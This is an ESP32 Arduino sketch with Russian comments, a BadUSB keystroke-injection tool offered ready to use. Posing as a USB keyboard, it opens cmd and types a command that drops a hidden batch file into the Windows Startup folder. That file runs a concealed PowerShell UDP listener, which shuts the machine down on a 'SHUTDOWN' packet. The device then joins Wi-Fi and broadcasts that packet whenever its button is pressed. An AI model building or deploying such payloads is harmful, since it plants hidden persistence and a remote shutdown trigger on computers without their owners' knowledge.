#include <WiFi.h>
#include <WiFiUdp.h>
#include "USB.h"
#include "USBHIDKeyboard.h"

const char* ssid = "ВАШ_WIFI";
const char* password = "ВАШ_ПАРОЛЬ";

USBHIDKeyboard kb;
WiFiUDP udp;

void winR(String txt) {
  kb.press(KEY_LEFT_GUI); kb.press('r'); delay(50); kb.releaseAll(); delay(400);
  if (txt != "") { kb.print(txt); delay(50); kb.write(KEY_RETURN); delay(800); }
}

void setup() {
  pinMode(0, INPUT_PULLUP);
  pinMode(LED_RED, OUTPUT); digitalWrite(LED_RED, HIGH); // Выкл

  USB.begin();
  kb.begin();
  delay(2000); // Ожидание ПК

  // Принудительно ENG раскладка
  kb.press(KEY_LEFT_GUI); kb.press(' '); delay(50); kb.releaseAll(); delay(200);

  winR("cmd");

  // Создание, скрытие, запуск и выход
  String cmd = "echo start /min powershell -w hidden -c \"$u=New-Object System.Net.Sockets.UdpClient(8080);while($true){$e=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,0);$d=$u.Receive([ref]$e);if([Text.Encoding]::ASCII.GetString($d) -eq 'SHUTDOWN'){shutdown /s /t 0}}\" > \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sys.bat\" & attrib +h \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sys.bat\" & start \"\" \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sys.bat\" & exit";
  kb.print(cmd);
  delay(50);
  kb.write(KEY_RETURN);
  delay(1500);

  winR("msg * \"Готово\"");

  kb.end();
  WiFi.begin(ssid, password); // Подключаемся к сети в фоне
}

void loop() {
  if (!digitalRead(0)) { // Если BOOT нажата
    delay(50);
    if (!digitalRead(0)) {
      digitalWrite(LED_RED, LOW); // Вкл красный

      udp.beginPacket("255.255.255.255", 8080);
      udp.print("SHUTDOWN");
      udp.endPacket();

      delay(5000); // Ждем 5 сек

      digitalWrite(LED_RED, HIGH); // Выкл красный
      while(!digitalRead(0)) delay(10); // Ждем отпускания
    }
  }
}
